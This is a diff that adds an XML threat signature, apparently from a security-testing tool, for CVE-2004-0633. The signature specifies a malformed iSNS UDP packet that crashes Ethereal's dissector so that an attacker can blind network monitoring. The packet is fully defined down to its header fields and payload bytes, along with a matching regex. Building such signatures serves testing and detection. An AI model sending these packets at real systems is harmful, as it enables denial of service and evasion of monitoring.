@@ -1,0 +1,74 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Ethereal iSNS Zero-Length Crash"/>
+    <EngDesc display="true" value="This threat sends a malformed packet that causes the protocol dissector of Ethereal to crash.  This can be used by an attacker to prevent a network administrator from sniffing network traffic."/>
+    <Intent display="true">
+      <item value="Crashing"/>
+      <item value="Evasion"/>
+    </Intent>
+    <Protocol display="true" value="iSNS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Sniffer"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Ethereal"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Ethereal"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Ethereal_10.4"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.securityfocus.com/bid/10672"/>
+    <CVEID display="true" value="CVE-2004-0633"/>
+    <bugtraqID display="true" value="10672"/>
+    <OSVDB display="true" value="7536"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="00000102d3269a1f00c000a80001003c16b9ca7c"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="false"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="high"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632725889667812500"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X32\X05\XEB\X9A\X00\X1C\X00\X01\X00\X01\X00\X1C\X04\X00\X00\X00\X00\X00\X00\X00\X00\X03\X00\X00\X00\X00"/>
+    <Created value="1139461997" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="Z"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0030" Identification="@random(0, FFFF)" FragmentOffset="0000" TTL="40" Protocol="11" HeaderChecksum="C221" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="@random(1026, 65535)" destPort="$destPort" checksum="EB9A" length="001C" Payload="00010001001C0400000000000000000300000000"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
